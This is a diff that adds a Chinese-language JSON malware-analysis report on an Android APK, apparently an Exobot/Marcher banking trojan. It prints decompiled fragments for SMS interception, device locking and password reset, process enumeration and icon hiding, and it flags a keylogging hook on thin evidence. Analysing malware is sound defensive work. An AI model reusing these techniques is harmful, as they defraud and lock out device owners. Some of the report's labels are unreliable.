@@ -1,0 +1,173 @@
+{
+  "APK信息": {
+    "文件名": "c8f753904c14ecee5d693ce454353b70e010bdaf89b2d80c824de22bd11147d5.apk",
+    "sha256": "c8f753904c14ecee5d693ce454353b70e010bdaf89b2d80c824de22bd11147d5",
+    "包名": "cisfm.rygkfxpsyyldznvjufubiacoriibbx",
+    "应用名": "Youporn",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1303.4
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcisfm\\rygkfxpsyyldznvjufubiacoriibbx\\p045s;",
+          "method_signature": "if(cisfm.rygkfxpsyyldznvjufubiacoriibbx.C064d.e.p(context)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (cisfm.rygkfxpsyyldznvjufubiacoriibbx.C064d.e.p(context) || cisfm.rygkfxpsyyldznvjufubiacoriibbx.C064d.e.o(context)) {\n    abortBroadcast();\n}\npublic void processIncomingMessages(Context context, Intent intent) {\n    if (this.b.b()) {\n        Object[] objArr = (Object[]) intent.getExtras().get(cisfm.rygkfxpsyyldznvjufubiacoriibbx.a.b.aQ);\n        SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n        for (int i = 0; i < objArr.length; i++) { ... }\n    }\n}",
+          "malicious_code_snippet_context": "              Log.d(f301a, \"ERROR: \" + e.getMessage());\n              e.printStackTrace();\n          }\n>>>         if (cisfm.rygkfxpsyyldznvjufubiacoriibbx.C064d.e.p(context) || cisfm.rygkfxpsyyldznvjufubiacoriibbx.C064d.e.o(context)) {\n>>>             abortBroadcast();\n>>>         }\n>>>     }\n>>> \n>>>     @Keep\n>>>     public void processIncomingMessages(Context context, Intent intent) {\n>>>         if (this.b.b()) {\n>>>             Object[] objArr = (Object[]) intent.getExtras().get(cisfm.rygkfxpsyyldznvjufubiacoriibbx.a.b.aQ);\n>>>             SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n              for (int i = 0; i < objArr.length; i++) {\n                  try {\n                      smsMessageArr[i] = (SmsMessage) SmsMessage.class.getMethod(cisfm.rygkfxpsyyldznvjufubiacoriibbx.a.b.aR, byte[].class).invoke(null, (byte[]) objArr[i]);",
+          "behavior_description": "该代码是一个短信广播接收器（BroadcastReceiver），属于 Exobot/Marcher 银行木马的短信拦截模块。当收到短信广播时，代码通过反射调用 processIncomingMessages 方法，从 Intent 的 extras 中提取短信 PDU 数据（Object[]）并解析为 SmsMessage 对象，读取短信内容和发送方号码；同时通过条件判断（C064d.e.p/o，通常为匹配特定号码或关键词，如银行验证码/mTAN）后调用 abortBroadcast() 终止广播传播，使系统短信应用和用户无法看到该短信。数据流向：系统短信广播（SMS_RECEIVED PDU 数据）→ 解析短信内容并上传/处理 + abortBroadcast() 静默拦截，导致用户收不到银行验证码短信，攻击者可借此完成转账等欺诈操作，直接造成用户财产损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "keylogging",
+      "中文名": "键盘记录",
+      "MITRE": "T1417",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "dispatchKeyEvent"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\support\\v7\\a\\ae;",
+          "method_signature": "dispatchKeyEvent(KeyEvent keyEvent)",
+          "malicious_behavior": "keylogging",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public boolean dispatchKeyEvent(KeyEvent keyEvent) {\n    return this.f98a.a(keyEvent);\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.view.ViewGroup, android.view.View\n>>>     public boolean dispatchKeyEvent(KeyEvent keyEvent) {\n>>>         return this.f98a.a(keyEvent);\n>>>     }\n  \n      @Override // android.view.ViewGroup\n      public boolean onInterceptTouchEvent(MotionEvent motionEvent) {",
+          "behavior_description": "该类伪装在android.support.v7包名下（混淆类名ae），重写了ViewGroup的dispatchKeyEvent方法，将用户的所有按键事件(KeyEvent)拦截并完整转发给外部对象f98a的a()方法处理，这是典型的键盘记录钩子。数据流向为：用户在恶意覆盖层(overlay)伪造界面上的按键输入(KeyEvent)→dispatchKeyEvent拦截→this.f98a.a(keyEvent)转发至木马按键处理器→（结合Exobot/Marcher银行木马上下文）窃取的账号密码等凭据被上传至C2服务器。此外onInterceptTouchEvent中的边界检测a(int,int)配合f98a.c(0)用于覆盖层攻击的触摸拦截，阻止用户与底层真实应用交互，与键盘记录配合窃取银行登录凭据。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcisfm\\rygkfxpsyyldznvjufubiacoriibbx\\services\\c;",
+          "method_signature": "if(devicePolicyManager.isAdminActive(new ComponentName(context, (Class<?>)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\nif (devicePolicyManager.isAdminActive(new ComponentName(context, (Class<?>) p018o.class))) {\n    devicePolicyManager.lockNow();\n}\n...\nif (devicePolicyManager.isAdminActive(new ComponentName(context, (Class<?>) p018o.class))) {\n    devicePolicyManager.resetPassword(\"\", 0);\n}",
+          "malicious_code_snippet_context": "  \n      @TargetApi(8)\n      public static void a(Context context, String str) {\n>>>         DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>         if (devicePolicyManager.isAdminActive(new ComponentName(context, (Class<?>) p018o.class))) {\n>>>             devicePolicyManager.resetPassword(str, 0);\n>>>         }\n>>>     }\n>>> \n>>>     public static void b(Context context) {\n>>>         String strA = cisfm.rygkfxpsyyldznvjufubiacoriibbx.C064d.e.a(context);\n          AudioManager audioManager = (AudioManager) context.getSystemService(\"audio\");\n          audioManager.setRingerMode(2);\n          String[] strArrSplit = strA.split(\",\");",
+          "behavior_description": "该代码通过 DevicePolicyManager 检查恶意 DeviceAdmin 接收器（p018o.class）是否处于激活状态，若已激活则调用 lockNow() 立即锁定设备屏幕，并调用 resetPassword(\"\", 0) 重置设备锁屏密码。这是典型的勒索软件设备锁行为：木马（Exobot/Marcher 变种）在诱骗用户授予设备管理器权限后，由恶意流程或远程指令触发锁屏，使用户被锁在设备之外无法正常使用，配合勒索信息实施敲诈。数据流向：恶意触发逻辑/C2远程指令 → DevicePolicyManager.lockNow()/resetPassword() 危险操作。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "listFiles"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcisfm\\rygkfxpsyyldznvjufubiacoriibbx\\e\\a;",
+          "method_signature": "a(Context context)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "File[] fileArrListFiles = new File(\"/proc\").listFiles();\nfor (File file : fileArrListFiles) {\n    if (file.isDirectory()) {\n        int i = Integer.parseInt(file.getName());\n        a aVar = new a(i);\n        if (aVar.f292a && ((aVar.b < 1000 || aVar.b > 9999) && !aVar.c.contains(\":\") && packageManager.getLaunchIntentForPackage(aVar.a()) != null)) {\n            arrayList.add(aVar);\n        }\n    }\n}",
+          "malicious_code_snippet_context": "  \n      public static List a(Context context) {\n          ArrayList arrayList = new ArrayList();\n>>>         File[] fileArrListFiles = new File(\"/proc\").listFiles();\n>>>         try {\n>>>             PackageManager packageManager = context.getPackageManager();\n>>>             for (File file : fileArrListFiles) {\n>>>                 if (file.isDirectory()) {\n>>>                     try {\n>>>                         int i = Integer.parseInt(file.getName());\n>>>                         try {\n>>>                             cisfm.rygkfxpsyyldznvjufubiacoriibbx.e.a.a aVar = new cisfm.rygkfxpsyyldznvjufubiacoriibbx.e.a.a(i);\n>>>                             if (aVar.f292a && ((aVar.b < 1000 || aVar.b > 9999) && !aVar.c.contains(\":\") && packageManager.getLaunchIntentForPackage(aVar.a()) != null)) {\n                                  arrayList.add(aVar);\n                              }\n                          } catch (c e) {",
+          "behavior_description": "该代码通过遍历 /proc 虚拟文件系统（数据来源）枚举设备上所有正在运行的进程：将 /proc 下以数字命名的目录解析为 PID，构造进程对象读取其包名、UID 和进程名，再通过 UID 范围过滤（排除 1000-9999 的系统服务进程）、排除内核线程（进程名含':'）、并要求该包名存在启动 Intent（getLaunchIntentForPackage != null），从而筛选出用户安装且当前正在运行的第三方应用，汇总为运行中应用列表返回（危险操作）。这是 Exobot(Marcher) 银行木马的典型侦察逻辑：持续监控用户设备上正在运行的应用，一旦检测到目标银行/金融类应用被启动，即触发钓鱼覆盖攻击窃取用户登录凭证，属于银行木马攻击链的核心组件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcisfm\\rygkfxpsyyldznvjufubiacoriibbx\\p078i;",
+          "method_signature": "invoke_hideApp()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "private void invoke_hideApp() {\n    getApplicationContext().getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), p085y.class.toString()), 1, 1);\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Keep\n>>>     private void invoke_hideApp() {\n>>>         getApplicationContext().getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), p085y.class.toString()), 1, 1);\n>>>     }\n  \n      public PendingIntent a() {\n          return PendingIntent.getBroadcast(this, 0, new Intent(\"p085y.AlarmAction\"), 0);",
+          "behavior_description": "该方法通过 PackageManager.setComponentEnabledSetting() 静默修改应用启动器组件（p085y，对应桌面图标入口的 Activity/alias）的启用状态，使应用图标从桌面启动器中消失。这是 Exobot(Marcher) 银行木马的典型规避手法：用户首次运行后图标即被隐藏，受害者无法发现和卸载该应用，而木马仍通过 p085y.AlarmAction 的 PendingIntent 广播定时唤醒（配合 MainThread.start）在后台持续保活运行，为后续的钓鱼覆盖攻击与银行凭据窃取提供持久化支撑。数据流向：getPackageName()/p085y.class（应用自身组件信息）→ setComponentEnabledSetting()（篡改组件启用状态实现图标隐藏）。 [未经交叉验证]",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
